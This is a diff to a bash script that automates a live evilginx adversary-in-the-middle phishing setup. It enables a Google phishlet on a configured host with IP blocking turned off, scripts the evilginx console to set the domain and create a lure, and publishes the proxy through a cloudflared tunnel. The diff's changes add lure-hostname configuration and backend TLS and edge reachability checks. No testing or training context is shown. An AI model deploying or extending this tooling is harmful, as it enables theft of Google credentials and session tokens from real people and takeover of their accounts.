@@ -26,11 +26,11 @@ sleep 2
 nohup "$CLOUDFLARED" tunnel --url "https://$HOST:443" --no-tls-verify > cloudflared.log 2>&1 &
 sleep 3
 
-echo "--- evilginx: full setup incl. lure ---"
+echo "--- evilginx: full setup incl. lure hostname ---"
 $SUDO mkdir -p /root/.evilginx
 echo "{\"phishlets\":{\"google\":{\"enabled\":true,\"hostname\":\"$HOST\",\"unauth_url\":\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\"}},\"blacklist\":{\"enabled\":false,\"ip_addresses\":[],\"ip_masks\":[]}}" | $SUDO tee /root/.evilginx/config.json >/dev/null
 rm -f /tmp/eg_in; mkfifo /tmp/eg_in
-( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; echo "lures create google"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
+( sleep 7; echo "config domain $HOST"; sleep 1; echo "config ipv4 external 203.0.113.7"; sleep 1; echo "config autocert off"; sleep 1; echo "phishlets hostname google $HOST"; sleep 1; echo "phishlets enable google"; sleep 1; echo "lures create google"; sleep 1; echo "lures edit 0 hostname $HOST"; sleep 1; tail -f /dev/null ) > /tmp/eg_in &
 "$SUDO" "$EVILGINX" -p "$PHISHLETS_DIR" -developer < /tmp/eg_in 2>&1 | tee evilginx.log &
 
 EG=0
@@ -39,18 +39,16 @@ for i in $(seq 1 30); do
   sleep 2
 done
 echo "EVILGINX_443=$EG"
-sleep 10
+sleep 12
 
+echo "--- lure + hostname state ---"
+grep -iE 'created lure|hostname set to|lure' evilginx.log | tail -n 6 || true
+echo "--- backend openssl (SNI=$HOST) ---"
+( echo | timeout 12 openssl s_client -connect 127.0.0.1:443 -servername "$HOST" 2>&1 | grep -iE 'CONNECTED|subject=|issuer=|CN =|Verify result|alert|error' ) || echo "NO_BACKEND_TLS"
 echo "--- edge probe ---"
 curl -sS -m 20 -o /tmp/edge.out -w 'EDGE_HTTP:%{http_code}\n' "$URL/" 2>&1 || echo "EDGE_PROBE_FAIL"
 head -c 200 /tmp/edge.out 2>/dev/null || true
 echo ""
-echo "--- cloudflared origin errors ---"
-grep -iE 'ERR|unrecognized|remote|origin' cloudflared.log | tail -n 12 || echo "(none)"
-echo "--- backend openssl (SNI=$HOST) ---"
-( echo | timeout 12 openssl s_client -connect 127.0.0.1:443 -servername "$HOST" 2>&1 | grep -iE 'CONNECTED|subject=|issuer=|CN =|Verify|verify|alert|error' ) || echo "NO_BACKEND_TLS"
-echo "--- lure ---"
-grep -iE 'created lure' evilginx.log | tail -n 3 || true
 
 echo "=== streaming evilginx output ==="
 trap 'kill %3 %2 %1 2>/dev/null || true' EXIT
